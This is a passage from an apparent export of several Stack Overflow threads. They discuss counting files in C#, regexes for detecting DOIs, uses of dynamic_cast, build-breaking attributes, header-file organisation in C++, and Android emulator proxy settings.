 <p>I was looking for a more optimized version. Since I haven't found it, I decided to code it and share it here:</p>

<pre><code>    public static int GetFileCount(string path, string searchPattern, SearchOption searchOption)
    {
        var fileCount = 0;
        var fileIter = Directory.EnumerateFiles(path, searchPattern, searchOption);
        foreach (var file in fileIter)
            fileCount++;
        return fileCount;
    }
</code></pre>

<p>All the solutions using the GetFiles/GetDirectories are kind of slow since all those objects need to be created. Using the enumeration, it doesn't create any temporary objects (FileInfo/DirectoryInfo).</p>

<p>see Remarks <a href=""http://msdn.microsoft.com/en-us/library/dd383571.aspx"" rel=""nofollow"">http://msdn.microsoft.com/en-us/library/dd383571.aspx</a> for more information</p>
 <p>The slickest method woud be to use linq:</p>

<pre><code>var fileCount = (from file in Directory.EnumerateFiles(@""H:\iPod_Control\Music"", ""*.mp3"", SearchOption.AllDirectories)
                    select file).Count();
</code></pre>
 <p>I have an app which generates counts of the directories and files in a parent directory. Some of the directories contain thousands of sub directories with thousands of files in each. To do this whilst maintaining a responsive ui I do the following ( sending the path to <em>ADirectoryPathWasSelected</em> method):</p>

<pre><code>public class DirectoryFileCounter
{
    int mDirectoriesToRead = 0;

    // Pass this method the parent directory path
    public void ADirectoryPathWasSelected(string path)
    {
        // create a task to do this in the background for responsive ui
        // state is the path
        Task.Factory.StartNew((state) =&gt;
        {
            try
            {
                // Get the first layer of sub directories
                this.AddCountFilesAndFolders(state.ToString())


             }
             catch // Add Handlers for exceptions
             {}
        }, path));
    }

    // This method is called recursively
    private void AddCountFilesAndFolders(string path)
    {
        try
        {
            // Only doing the top directory to prevent an exception from stopping the entire recursion
            var directories = Directory.EnumerateDirectories(path, ""*.*"", SearchOption.TopDirectoryOnly);

            // calling class is tracking the count of directories
            this.mDirectoriesToRead += directories.Count();

            // get the child directories
            // this uses an extension method to the IEnumerable&lt;V&gt; interface,
           // which will run a function on an object. In this case 'd' is the 
           // collection of directories
            directories.ActionOnEnumerable(d =&gt; AddCountFilesAndFolders(d));
        }
        catch // Add Handlers for exceptions
        {
        }
        try
        {
            // count the files in the directory
            this.mFilesToRead += Directory.EnumerateFiles(path).Count();
        }
        catch// Add Handlers for exceptions
        { }
    }
}
// Extension class
public static class Extensions
{ 
    // this runs the supplied method on each object in the supplied enumerable
    public static void ActionOnEnumerable&lt;V&gt;(this IEnumerable&lt;V&gt; nodes,Action&lt;V&gt; doit)
    {

        foreach (var node in nodes)
        {   
            doit(node);
        }
    }
}
</code></pre>
"
"Finding a DOI in a document or page <p>The <a href=""http://doi.org/"">DOI</a> system places basically no useful limitations on what constitutes <a href=""http://doi.org/handbook_2000/enumeration.html#2.2"">a reasonable identifier</a>. However, being able to pull DOIs out of PDFs, web pages, etc. is quite useful for citation information, etc.</p>

<p>Is there a reliable way to identify a DOI in a block of text without assuming the 'doi:' prefix? (any language acceptable, regexes preferred, and avoiding false positives a must)</p>
 <p>The following regex should do the job (Perl regex syntax):</p>

<pre><code>/(10\.\d+\/\d+)/
</code></pre>

<p>You could do some additional sanity checking by opening the urls</p>

<pre><code>http://hdl.handle.net/&lt;doi&gt;
</code></pre>

<p>and</p>

<pre><code>http://dx.doi.org/&lt;doi&gt;
</code></pre>

<p>where  is the candidate doi,</p>

<p>and testing that you a) get a 200 OK http status, and b) the returned page is not the ""DOI not found"" page for the service.</p>
 <p>@Silas The sanity checking is a good idea. However, the regex doesn't cover all DOIs. The first element must (currently) be 10, and the second element must (currently) be numeric, but the third element is barely restricted at all:</p>

<blockquote>
  <p>""Legal characters are the legal graphic characters of Unicode. This specifically excludes the control character ranges 0x00-0x1F and 0x80-0x9F...""  </p>
</blockquote>

<p>and that's where the real problem lies. In practice, I've never seen whitespace used, but the spec specifically allows for it. Basically, there doesn't seem to be a sensible way of detecting the <em>end</em> of a DOI.</p>
 <p>I'm sure it's not super-helpful for the OP at this point, but I figured I'd post what I am trying in case anyone else like me stumbles upon this:</p>

<pre><code>(10.(\d)+/(\S)+)
</code></pre>

<p>This matches: ""10 dot number slash anything-not-whitespace"" </p>

<p>But for my use (scraping HTML), this was finding false-positives, so I had to match the above, plus get rid of quotes and greater-than/less-than:</p>

<pre><code>(10.(\d)+/([^(\s\&gt;\""\&lt;)])+)
</code></pre>

<p>I'm still testing these out, but I'm feeling hopeful thus far.</p>
 <p>Here is my go at it:</p>

<pre><code>(10[.][0-9]{4,}[^\s""/&lt;&gt;]*/[^\s""&lt;&gt;]+)
</code></pre>

<p>And a couple of valid edge cases where this doesn't fail, but others seem to do:</p>

<ul>
<li><a href=""http://dx.doi.org/10.1007/978-3-642-28108-2_19"" rel=""nofollow""><code>10.1007/978-3-642-28108-2_19</code></a></li>
<li><code>10.1007.10/978-3-642-28108-2_19</code> (fictitious example, see <a href=""http://stackoverflow.com/a/1876427/89771"">@Ju9OR comment</a>)</li>
<li><a href=""http://dx.doi.org/10.1016/S0735-1097%2898%2900347-7"" rel=""nofollow""><code>10.1016/S0735-1097(98)00347-7</code></a></li>
<li><a href=""http://dx.doi.org/10.1579/0044-7447%282006%2935%5B89%3aRDUICP%5D2.0.CO;2"" rel=""nofollow""><code>10.1579/0044-7447(2006)35\[89:RDUICP\]2.0.CO;2</code></a></li>
</ul>

<p>Also, correctly discards some falsy (X|HT)ML stuff like:</p>

<ul>
<li><code>&lt;geo coords=""10.4515260,51.1656910""&gt;&lt;/geo&gt;</code></li>
</ul>
 <p>Ok, I'm currently extracting thousands of DOIs from free form text (XML) and I realized that <a href=""http://stackoverflow.com/a/10300246/89771"">my previous approach</a> had a few problems, namely regarding encoded entities and trailing punctuation, so I went on reading <a href=""http://www.doi.org/doi_handbook/2_Numbering.html"">the specification</a> and this is the best I could come with.</p>

<hr>

<blockquote>
  <p>The DOI prefix shall be composed of a directory indicator followed by
  a registrant code. These two components shall be separated by a full
  stop (period).</p>
  
  <p>The directory indicator shall be ""10"". The directory indicator
  distinguishes the entire set of character strings (prefix and suffix)
  as digital object identifiers within the resolution system.</p>
</blockquote>

<p>Easy enough, the initial <code>\b</code> prevents us from ""matching"" a ""DOI"" that doesn't start with <code>10.</code>:</p>

<pre><code>$pattern = '\b(10[.]';
</code></pre>

<hr>

<blockquote>
  <p>The second element of the DOI prefix shall be the registrant code. The
  registrant code is a unique string assigned to a registrant.</p>
</blockquote>

<p>Also, all assigned registrant code are numeric, and at least 4 digits long, so:</p>

<pre><code>$pattern = '\b(10[.][0-9]{4,}';
</code></pre>

<hr>

<blockquote>
  <p>The registrant code may be further divided into sub-elements for
  administrative convenience if desired. Each sub-element of the
  registrant code shall be preceded by a full stop.</p>
</blockquote>

<pre><code>$pattern = '\b(10[.][0-9]{4,}(?:[.][0-9]+)*';
</code></pre>

<hr>

<blockquote>
  <p>The DOI syntax shall be made up of a DOI prefix and a DOI suffix
  separated by a forward slash.</p>
</blockquote>

<p>However, this isn't absolutely necessary, section 2.2.3 states that uncommon suffix systems may use other conventions (such as <code>10.1000.123456</code> instead of <code>10.1000/123456</code>), but lets cut some slack.</p>

<pre><code>$pattern = '\b(10[.][0-9]{4,}(?:[.][0-9]+)*/';
</code></pre>

<hr>

<blockquote>
  <p>The DOI name is case-insensitive and can incorporate any printable
  characters from the legal graphic characters of Unicode. The DOI
  suffix shall consist of a character string of any length chosen by the
  registrant. Each suffix shall be unique to the prefix element that
  precedes it. The unique suffix can be a sequential number, or it might
  incorporate an identifier generated from or based on another system.</p>
</blockquote>

<p>Now this is where it gets trickier, from all the DOIs I have processed, I saw the following characters (besides <code>[0-9a-zA-Z]</code> of course) in their <strong>suffixes</strong>: <code>.-()/:-</code> -- so, while it doesn't exist, the DOI <code>10.1016.12.31/nature.S0735-1097(98)2000/12/31/34:7-7</code> is completely plausible.</p>

<p>The logical choice would be to use <code>\S</code> or the <code>[[:graph:]]</code> PCRE POSIX class, so lets do that:</p>

<pre><code>$pattern = '\b(10[.][0-9]{4,}(?:[.][0-9]+)*/\S+'; // or
$pattern = '\b(10[.][0-9]{4,}(?:[.][0-9]+)*/[[:graph:]]+';
</code></pre>

<hr>

<p>Now we have a difficult problem, the <code>[[:graph:]]</code> class is a super-set of the <code>[[:punct:]]</code> class, which includes characters easily found in free text or any markup language: <code>""'&amp;&lt;&gt;</code> among others.</p>

<p>Lets just filter the markup ones for now using a negative lookahead:</p>

<pre><code>$pattern = '\b(10[.][0-9]{4,}(?:[.][0-9]+)*/(?:(?![""&amp;\'&lt;&gt;])\S)+'; // or
$pattern = '\b(10[.][0-9]{4,}(?:[.][0-9]+)*/(?:(?![""&amp;\'&lt;&gt;])[[:graph:]])+';
</code></pre>

<hr>

<p>The above should cover encoded entities (<code>&amp;</code>), attribute quotes (<code>[""']</code>) and open / close tags (<code>[&lt;&gt;]</code>).</p>

<p>Unlike markup languages, free text usually doesn't employ punctuation characters unless they are bounded by at least one space <strong><em>or</em></strong> placed at the end of a sentence, for instance:</p>

<blockquote>
  <p>This is a long DOI:
  <code>10.1016.12.31/nature.S0735-1097(98)2000/12/31/34:7-7</code><strong>!!!</strong></p>
</blockquote>

<p>The solution here is to close our capture group and assert another word boundary:</p>

<pre><code>$pattern = '\b(10[.][0-9]{4,}(?:[.][0-9]+)*/(?:(?![""&amp;\'&lt;&gt;])\S)+)\b'; // or
$pattern = '\b(10[.][0-9]{4,}(?:[.][0-9]+)*/(?:(?![""&amp;\'&lt;&gt;])[[:graph:]])+)\b';
</code></pre>

<p>And <em>voilá</em>, <a href=""http://regexpal.com/?flags=g&amp;regex=%5Cb%2810%5B.%5D%5B0-9%5D%7B4%2C%7D%28%3F%3A%5B.%5D%5B0-9%5D%2B%29%2a%2F%28%3F%3A%28%3F!%5B%22%26%5C%27%3C%3E%5D%29%5CS%29%2B%29%5Cb&amp;input=This%20is%20a%20short%20DOI%3A%2010.1000%2F123456.%0AThis%20is%20NOT%20a%20DOI%3A%204210.1000%2F123456.%0AThis%20is%20a%20long%20DOI%3A%2010.1016.12.31%2Fnature.S0735-1097%2898%292000%2F12%2F31%2F34%3A7-7!!!%0A%0A10.1007%2F978-3-642-28108-2_19%0A10.1007.10%2F978-3-642-28108-2_19%20%28fictitious%20example%2C%20see%20%40Ju9OR%20comment%29%0A10.1016%2FS0735-1097%2898%2900347-7%0A10.1579%2F0044-7447%282006%2935%5C%5B89%3ARDUICP%5C%5D2.0.CO%3B2%0A%0AAlso%2C%20correctly%20discards%20some%20falsy%20%28X%7CHT%29ML%20stuff%20like%3A%0A%0A%3Cgeo%20coords%3D%2210.4515260%2C51.1656910%22%3E%3C%2Fgeo%3E"">here is a demo</a>.</p>
 <p>This is a really old and answered question, but here's another potential substitute.</p>

<pre><code>\b10\.(\d+\.*)+[\/](([^\s\.])+\.*)+\b
</code></pre>

<p>This assumes that white space is not part of the DOI.</p>

<p>Haven't tested this for false positives, but it seems to be able to find all the edge cases mentioned in this page.</p>
"
"How bad is dynamic casting? <p>We often hear/read that one should avoid dynamic casting. I was wondering what would be 'good use' examples of it, according to you?</p>

<p>Edit:</p>

<p>Yes, I'm aware of <a href=""http://stackoverflow.com/questions/28002/regular-cast-vs-staticcast-vs-dynamiccast"">that other thread</a>: it is indeed when reading one of the first answers there that I asked my question!</p>
 <p>My current toy project uses dynamic_cast twice; once to work around the lack of multiple dispatch in C++ (it's a visitor-style system that could use multiple dispatch instead of the dynamic_casts), and once to special-case a specific subtype.</p>

<p>Both of these are acceptable, in my view, though the former at least stems from a language deficit.  I think this may be a common situation, in fact; most dynamic_casts (and a great many ""design patterns"" in general) are workarounds for specific language flaws rather than something that aim for.</p>
 <p>It can be used for a bit of run-time type-safety when exposing handles to objects though a C interface.  Have all the exposed classes inherit from a common base class.  When accepting a handle to a function, first cast to the base class, then dynamic cast to the class you're expecting.  If they passed in a non-sensical handle, you'll get an exception when the run-time can't find the rtti.  If they passed in a valid handle of the wrong type, you get a NULL pointer and can throw your own exception.  If they passed in the correct pointer, you're good to go.
This isn't fool-proof, but it is certainly better at catching mistaken calls to the libraries than a straight reinterpret cast from a handle, and waiting until some data gets mysteriously corrupted when you pass the wrong handle in.</p>
 <p>Here's something I do often, it's not pretty, but it's simple and useful.</p>

<p>I often work with template containers that implement an interface,
imagine something like</p>

<pre><code>template&lt;class T&gt;
class MyVector : public ContainerInterface
...
</code></pre>

<p>Where ContainerInterface has basic useful stuff, but that's all. If I want a specific algorithm on vectors of integers without exposing my template implementation, it is useful to accept the interface objects and dynamic_cast it down to MyVector in the implementation. Example:</p>

<pre><code>// function prototype (public API, in the header file)
void ProcessVector( ContainerInterface&amp; vecIfce );

// function implementation (private, in the .cpp file)
void ProcessVector( ContainerInterface&amp; vecIfce)
{
    MyVector&lt;int&gt;&amp; vecInt = dynamic_cast&lt;MyVector&lt;int&gt; &gt;(vecIfce); 
    // the cast throws bad_cast in case of error but you could use a
    // more complex method to choose which low-level implementation
    // to use, basically rolling by hand your own polymorphism.

    // Process a vector of integers
    ...
}
</code></pre>

<p>I could add a Process() method to the ContainerInterface that would be polymorphically resolved, it would be a nicer OOP method, but I sometimes prefer to do it this way. When you have simple containers, a lot of algorithms and you want to keep your implementation hidden, dynamic_cast offers an easy and ugly solution.</p>

<p>You could also look at double-dispatch techniques.</p>

<p>HTH</p>
 <p>Well it would really be nice with extension methods in C#.</p>

<p>For example let's say I have a list of objects and I want to get a list of all ids from them.  I can step through them all and pull them out but I would like to segment out that code for reuse.</p>

<p>so something like</p>

<pre><code>List&lt;myObject&gt; myObjectList = getMyObjects();

List&lt;string&gt; ids = myObjectList.PropertyList(""id"");
</code></pre>

<p>would be cool except on the extension method you won't know the type that is coming in.</p>

<p>So </p>

<pre><code>public static List&lt;string&gt; PropertyList(this object objList, string propName) {
    var genList = (objList.GetType())objList;
}
</code></pre>

<p>would be awesome.</p>
 <p>This recent thread gives an example of where it comes in handy. There is a base Shape class and classes Circle and Rectangle derived from it. In testing for equality, it is obvious that a Circle cannot be equal to a Rectangle and it would be a disaster to try to compare them. While iterating through a collection of pointers to Shapes, dynamic_cast does double duty, telling you if the shapes are comparable and giving you the proper objects to do the comparison on.</p>

<p><a href=""http://stackoverflow.com/questions/301959/vector-iterator-not-dereferencable"">http://stackoverflow.com/questions/301959/vector-iterator-not-dereferencable</a></p>
 <p>It is very useful, however, most of the times it is <em>too</em> useful: if for getting the job done the easiest way is to do a dynamic_cast, it's more often than not a symptom of bad OO design, what in turn might lead to trouble in the future in unforeseen ways.</p>
"
"Create an Attribute to Break the Build <p>OK, this kind of follows on from <a href=""http://stackoverflow.com/questions/27758/notify-developer-of-a-do-not-use-method"" rel=""nofollow"">my previous question</a>.</p>

<p>What I would really like to do is create some sort of attribute which allows me to decorate a method that will <strong>break the build</strong>. Much like the <em>Obsolete(""reason"", true)</em> attribute, but without falsely identifying obsolete code.</p>

<p><strong>To clarify</strong>: I dont want it to break the build on <em>ANY</em> F6 (Build) press, I only want it to break the build if a method decorated with the attribute is called somewhere else in the code. Like I said, <em>similar</em> to obsolete, but not the same.</p>

<p>I know I am not alone in this, since <a href=""http://stackoverflow.com/questions/27758/notify-developer-of-a-do-not-use-method#27796"" rel=""nofollow"">other users want to use it for other reasons</a>. I have never created custom attributes before so it is all new to me!</p>
 <p>This is all starting to sound a bit like <a href=""http://thedailywtf.com/Articles/SUSBSTITUTE_CODE.aspx"" rel=""nofollow"">Yesterday's TDWTF</a>. :-)</p>
 <p>If you consider a warning (which is what [Obsolete] throws up) build-breaking, then just use the <a href=""http://msdn.microsoft.com/en-us/library/963th5x3.aspx"" rel=""nofollow"">#warning</a> compiler directive.</p>

<p>Edit: I've never used it, but <a href=""http://msdn.microsoft.com/en-us/library/x5hedts0.aspx"" rel=""nofollow"">#error</a> is also available.</p>
 <p>Why not just make something up?  An unknown attribute would surely break the build.</p>

<pre><code>[MyMadeUpAttributeThatBreaksTheBuildForSure]
public class NotDoneYet {}
</code></pre>
 <p>I will have to agree with Greg: make up an attribute for it. </p>

<p>And if you're really serious, maybe find a way to figure out if the constructor is being accessed by anything other than XMLSerializer and throw an exception if it is.</p>
 <p>If this is for XML serialization and NHibernate, where you want the parameterless constructor to be accessible (as is the case in the <a href=""http://stackoverflow.com/questions/27758/notify-developer-of-a-do-not-use-method#27796"" rel=""nofollow"">example</a> you referenced), then use a private or protected parameterless constructor for serialization, or a protected constructor for NHibernate.  With the protected version, you are opening yourself up to inherited classes being able to call that code.</p>

<p>If you don't want code calling a method, don't make it accessible.</p>

<p>EDIT: To perhaps answer the deeper question, AFAIK the compiler only knows about three attributes: <a href=""http://msdn.microsoft.com/en-us/library/aa664620(VS.71).aspx"" rel=""nofollow"">Obsolete, Conditional, and AttributeUsage</a>. To add special handling for other attributes would require modifying the compiler.</p>
 <p>I'd suggest you to use the #error directive.</p>

<p>Another pretty unknown attribute that might do the work is the <a href=""http://msdn.microsoft.com/en-us/library/system.diagnostics.conditionalattribute.aspx"" rel=""nofollow"">conditional attribute</a> (depending on what you're trying to ahieve)</p>

<pre><code>[Conditional(""CONDITION"")] 
public static void MiMethod(int a, string msg)
</code></pre>

<p>which will remove the method invocation from the IL code itself if ""MY_CONDITION"" is defined.</p>
 <p>Create an FxCop rule, and add FxCop to your integration build in order to check for this.</p>

<p>You'll get warnings, rather than a failing build.  Attributes 'run' at reflection time rather than build time.</p>

<p>Alternatively (and this is rather nasty) put a compiler directive around the method you don't want to be called. Then your code will break if you call it, but you can set up a build that passes the right compiler directive and doesn't.</p>
 <p>I think the only fool proof way would be to extend the Visual Studio (through VSIP) and subscribe to the correct event (maybe in the EnvDTE.BuildEvents) class, and check your code for usage of the constructor, and cancel the build if you detect it.</p>
 <p>I think this would be an excellent feature request for Microsoft: Create an abstract base class attribute <code>CompilerExecutedAttribute</code> that the compiler processes in some manner or that can influence the compiling process. Then we could inherit from this attribute and implement different operations, e.g. emit an error or a warning.</p>
 <p>Throw a custom exception and unit test for it as a post build step</p>
 <p>Responding 4 years later :) </p>

<p>I had same question if there were an alternative to Obsolete. </p>

<p>From what I recall (channel9 videos) a little while ago Microsoft stated that it is working on giving devs access to something like a compiler api at some point so in the future it's conceivable that you could write a compiler ""plugin"" that would allow to to decorate methods with your own custom attribute and tell the compiler to cancel if it looks like the decorated code could be getting called some where else in the code etc. </p>

<p>Which would actually be pretty cool when you think about it. It also reminds me that I should also try and read up on the progress of that compiler api thing MS is working on ...</p>
"
"Multiple classes in a header file vs. a single header file per class <p>For whatever reason, our company has a coding guideline that states:</p>

<p><code>Each class shall have it's own header and implementation file.</code></p>

<p>So if we wrote a class called <code>MyString</code> we would need an associated <strong>MyStringh.h</strong> and <strong>MyString.cxx</strong>.</p>

<p>Does anyone else do this?  Has anyone seen any compiling performance repercussions as a result?  Does 5000 classes in 10000 files compile just as quickly as 5000 classes in 2500 files?  If not, is the difference noticeable?</p>

<p>[We code C++ and use GCC 3.4.4 as our everyday compiler]</p>
 <p>We do that at work, its just easier to find stuff if the class and files have the same name. As for performance, you really shouldn't have 5000 classes in a single project. If you do, some refactoring might be in order.</p>

<p>That said, there are instances when we have multiple classes in one file. And that is when it's just a private helper class for the main class of the file.</p>
 <p>It's common practice to do this, especially to be able to include .h in the files that need it. Of course the performance is affected but try not to think about this problem until it arises :).<br />
It's better to start with the files separated and after that try to merge the .h's that are commonly used together to improve performance if you really need to. It all comes down to dependencies between files and this is very specific to each project.</p>
 <p>+1 for separation.  I just came onto a project where some classes are in files with a different name, or lumped in with another class, and it is impossible to find these in a quick and efficient manner.  You can throw more resources at a build - you can't make up lost programmer time because (s)he can't find the right file to edit.</p>
 <p>The same rule applies here, but it notes a few exceptions where it is allowed Like so:</p>

<ul>
<li>Inheritance trees</li>
<li>Classes that are only used within a <strong>very</strong> limited scope</li>
<li>Some Utilities are simply placed in a general 'utils.h'</li>
</ul>
 <p>G'day,</p>

<p>Most places where I have worked have folowed this practice. I've actually written coding standards for BAE (Aust.) along with the reasons why instead of just carving something in stone with no real justification.</p>

<p>Concerning your question about source files, it's not so much time to compile but more an issue of being able to find the relevant code snippet in the first place. Not everyone is using an IDE. And knowing that you just look for MyClass.h and MyClass.cpp really saves time compared to running ""grep MyClass *.(h|cpp)"" over a bunch of files and then filtering out the #include MyClass.h statements...</p>

<p>Mind you there are work-arounds for the impact of large numbers of source files on compile times. See Large Scale C++ Software Design by John Lakos for an interesting discussion.</p>

<p>You might also like to read Code Complete by Steve McConnell for an excellent chapter on coding guidelines. Actualy, this book is a great read that I keep coming back to regularly</p>

<p>cheers,
Rob</p>
 <p>The term here is <strong>translation unit</strong> and you really want to (if possible) have one class per translation unit ie, one class implementation per .cpp file, with a corresponding .h file of the same name.</p>

<p>It's usually more efficient (from a compile/link) standpoint to do things this way, especially if you're doing things like incremental link and so forth. The idea being, translation units are isolated such that, when one translation unit changes, you don't have to rebuild a lot of stuff, as you would have to if you started lumping many abstractions into a single translation unit.</p>

<p>Also you'll find many errors/diagnostics are reported via file name (""Error in Myclass.cpp, line 22"") and it helps if there's a one-to-one correspondence between files and classes. (Or I suppose you could call it a 2 to 1 correspondence).</p>
 <p>In addition to simply being ""clearer"", separating classes into separate files makes it easier for multiple developers not to step on each others toes.  There will be less merging when it comes time to commit changes to your version control tool.</p>
 <p>The best practice, as others have said, is to place each class in its own translation unit from a code maintenance and understandability perspective. However on large scale systems this is sometimes not advisable - see the section entitled ""Make Those Source Files Bigger"" in <a href=""http://www.cygnus-software.com/papers/precompiledheaders.html"" rel=""nofollow"">this article</a> by Bruce Dawson for a discussion of the tradeoffs.</p>
 <p>It is very helpful to have only have one class per file, but if you do your building via bulkbuild files which include all the individual C++ files, it makes for faster compilations since startup time is relatively large for many compilers.</p>
 <h2>Overwhelmed by thousands lines of code?</h2>

<p>Having one set of header/source files per class in a directory can seem overkill. And if the number of classes goes toward 100 or 1000, it can even be frightening.</p>

<p>But having played with sources following the philosophy ""let's put together everything"", the conclusion is that only the one who wrote the file has any hope to not be lost inside. Even with an IDE, it is easy to miss things because <strong>when you're playing with a source of 20,000 lines, you just close your mind for anything not exactly refering to your problem.</strong></p>

<p><i>Real life example: the class hierarchy defined in those thousand lines sources closed itself into a diamond-inheritance, and some methods were overridden in child classes by methods with exactly the same code. This was easily overlooked (who wants to explore/check a 20,000 lines source code?), and when the original method was changed (bug correction), the effect was not as universal as excepted.</i></p>

<h2>Dependancies becoming circular?</h2>

<p>I had this problem with templated code, but I saw similar problems with regular C++ and C code.</p>

<p>Breaking down your sources into 1 header per struct/class lets you:</p>

<ul>
<li>Speed up compilation because you can use symbol forward-declaration instead of including whole objects</li>
<li>Have circular dependencies between classes (§) (i.e. class A has a pointer to B, and B has a pointer to A)</li>
</ul>

<p>In source-controlled code, class dependencies could lead to regular moving of classes up and down the file, just to make the header compile. You don't want to study the evolution of such moves when comparing the same file in different versions.</p>

<p><strong>Having separate headers makes the code more modular, faster to compile, and makes it easier to study its evolution through different versions diffs</strong></p>

<p><i>For my template program, I had to divide my headers into two files: The .HPP file containing the template class declaration/definition, and the .INL file containing the definitions of the said class methods.</p>

<p>Putting all this code inside one and only one unique header would mean putting class definitions at the begining of this file, and the method definitions at the end.</p>

<p>And then, if someone needed only a small part of the code, with the one-header-only solution, they still would have to pay for the slower compilation.</i></p>

<p>(§) Note that you can have circular dependencies between classes if you know which class owns which. This is a discussion about classes having knowledge of the existence of other classes, not shared_ptr circular dependencies antipattern.</p>

<h2>One last word: Headers should be self-sufficients</h2>

<p>One thing, though, that must be respected by a solution of multiple headers and multiple sources.</p>

<p><strong>When you include one header, no matter which header, your source must compile cleanly.</strong></p>

<p>Each header should be self-sufficient. You're supposed to develop code, not treasure-hunting by greping your 10,000+ source files project to find which header defines the symbol in the 1,000 lines header you need to include just because of <em>one</em> enum.</p>

<p>This means that either each header defines or forward-declare all the symbols it uses, or include all the needed headers (and only the needed headers).</p>
 <p>I found these guidelines particularly useful when it comes to header files :
<a href=""http://google-styleguide.googlecode.com/svn/trunk/cppguide.xml#Header_Files"" rel=""nofollow"">http://google-styleguide.googlecode.com/svn/trunk/cppguide.xml#Header_Files</a></p>
 <p>I'm surprised that almost everyone is in favor of having one file per class. The problem with that is that in the age of 'refactoring' one may have a hard time keeping the file and class names in synch. Everytime you change a class name, you then have to change the file name too, which means that you have to also make a change everywhere the file is included. </p>

<p>I personally group related classes into a single files and then give such a file a meaningful name that won't have to change even if a class name changes. Having fewer files also makes scrolling through a file tree easier. 
I use Visual Studio on Windows and Eclipse CDT on Linux, and both have shortcut keys that take you straight to a class declaration, so finding a class declaration is easy and quick. </p>

<p>Having said that, I think once a project is completed, or its structure has 'solidified', and name changes become rare, it may make sense to have one class per file. I wish there was a tool that could extract classes and place them in distinct .h and .cpp files. But I don't see this as essential.</p>

<p>The choice also depends on the type of project one works on. In my opinion the issue doesn't deserve a black and white answer since either choice has pros and cons. </p>
"
"Proxy which requires authentication with Android Emulator <p>Has anybody managed to get the Android Emulator working behind a proxy which requires authentication?</p>

<p>I've tried setting the -http-proxy argument to </p>

<pre><code>http://DOMAIN/USERNAME:PASSWORD@IP:PORT
</code></pre>

<p>but am having no success. </p>

<p>I've tried following the docs to no avail. I've also tried the <code>-verbose-proxy</code> setting but this no longer seems to exist.</p>

<p>Any pointers?</p>
 <p>I've not used the Android Emulator but I have set the $http_proxy environment variable for perl and wget and a few cygwin tools on windows. That might work for you for android, but the slash in the domain name seems like a potential problem.
I know I tried having my domain ""GLOBAL"" in there, but ended up taking it out and sticking with: <code>http://$USER:password@www-proxy.company.com:80</code></p>

<p>One problem I run into a lot though is programs that cannot be told to use the proxy for DNS queries too. In cases where they don't I always get a host name not found. I'd like to find a local dns resolver that can use the proxy for all the programs that won't.</p>
 <p>I remember having the same problem - After searching on the web, I found this solution - From the command line,</p>

<pre><code>1. &gt; adb shell
2. # sqlite3 /data/data/com.android.providers.settings/databases/settings.db
3. sqlite&gt; INSERT INTO system VALUES(99,’http_proxy', 'proxy:port');
4. sqlite&gt;.exit
</code></pre>

<p>EDIT:
Edited answer to reflect the latest version of Android.</p>
 <p>It seems like SDK 1.5 onwards, the <code>-http-proxy</code> flag also doesn't work. What did work for me is to boot the android image in the emulator and then once Android is running, go to <code>Home &gt; Menu &gt; Settings &gt; Wireless Controls &gt; Mobile Networks &gt; Access Point Names</code> and then setup the http proxy settings for the default access point.</p>

<p>With the APN proxy settings in place, I can get the emulator's browser to surf the web. However, other stuff like Maps still doesn't work.</p>
 <p>Jay, though that would be the ideal place for this information, it has not been updated for 2.1. Below I will list the methods that currently do NOT work for the 2.1 emulator.</p>

<p>The http-post argument does not work for the 2.1 emulator.
Setting a proxy in the APN list within the 2.1 emulator does not work.
Inserting the proxy directly into the system table via sql-lite does not work with 2.1.</p>

<p>In fact, the ONLY way to get the browser to connect to the internet via the emulator that I've found in 2.1, is to NOT use a proxy at all. I really hope this gets fixed soon, for there are many people with this same problem.</p>
 <p>Apparently this problems runs only with Android 2.x and Windows.
There is a opened bug here :
<a href=""http://code.google.com/p/android/issues/detail?id=5508&amp;q=emulator%20proxy&amp;colspec=ID%20Type%20Status%20Owner%20Summary%20Stars"">http://code.google.com/p/android/issues/detail?id=5508&amp;q=emulator%20proxy&amp;colspec=ID%20Type%20Status%20Owner%20Summary%20Stars</a></p>
 <p>I Managed to do it in the Adndroid 2.2 Emulator.</p>

<pre><code>Go to ""Settings"" -&gt; ""Wireless &amp; Networks"" -&gt; ""Mobile Networks"" -&gt; ""Access Point Names"" -&gt; ""Telkila""
</code></pre>

<p>Over there set the proxy host name in the property ""Proxy""
and the Proxy port in the property ""Port""</p>
 <p>I was able to view the traffic with an HTTP sniffer instead of a proxy. I used HTTPScoop, which is a nice little app.</p>

<p>Also the nice thing about using HTTPScoop is that I can also see traffic on my actual device when I turn on internet sharing and have my phone use the wifi from my mac. So this is a good deal for debugging what happens on the phone itself AND the emulator.</p>

<p>This way it doesn't matter what emulator you use, because the sniffer sees the traffic independent of the emulator, device, compiler settings etc.</p>
 <p>This worked for me: <a href=""http://code.google.com/p/android/issues/detail?id=5508#c39"" rel=""nofollow"">http://code.google.com/p/android/issues/detail?id=5508#c39</a><br />
Apparently there's a bug in the emulator that forces you to use the IP address of the proxy instead of the name...</p>
 <ol>
<li><p>Find the file <code>androidtool.cfg</code> at <code>C:\Documents and Settings\YOUR USER NAME\.android\</code></p></li>
<li><p>Add this line:</p>

<pre><code>http.proxyLogin=USER@PASSWORD
</code></pre></li>
<li><p>Save the file and try to open the Android SDK.</p></li>
</ol>
 <p>I will explain all the steps:</p>

<ol>
<li>Go to settings in Android emulator > Wireless &amp; Network > Mobile network > Access point > Telkilla > and here do necessary settings such as proxy, port, etc.</li>
</ol>

<p>I think now everything is clear about proxy settings...</p>
 <ol>
<li><p>Start command prompt.</p></li>
<li><p>Go the folder where your emulator is located. In general, it will be in the tools folder of the Android SDK.</p></li>
<li><p>Then use the following command:</p>

<pre><code>emulator -avd &lt;avd name&gt; -http-proxy &lt;server&gt;:&lt;proxy&gt;
</code></pre>

<p>By using this, we will be able to access the internet using the browser.</p></li>
</ol>
 <p>For Android2.3.3
Settings->Wireless&amp;Networks->MobileNetworks->AccessPointNames->Telkila->
set the Proxy and the Port here (xx.xx.xx.xx and port)</p>
 <p>Using Android SDK 1.5 emulator with proxy in Eclipse 3.45</p>

<p>Go to Package Explorer -> Right click your Android project ->Run As->Run Configurations.</p>

<p>Under Android Application on the left column, select your project -> on the right column, where you see Android | Target | Common tabs -></p>

<p>Select Target -> on the bottom “Additional Emulator Command Line Options”-></p>

<p>-http-proxy <a href=""http://www.gateProxy.com:1080"" rel=""nofollow"">http://www.gateProxy.com:1080</a> -debug-proxy <a href=""http://www.gateProxy.com:1080"" rel=""nofollow"">http://www.gateProxy.com:1080</a></p>

<p>->Run/Close.</p>
 <p>For setting proxy server we need to set APNS setting. To do this:</p>

<ul>
<li>Go to Setting</li>
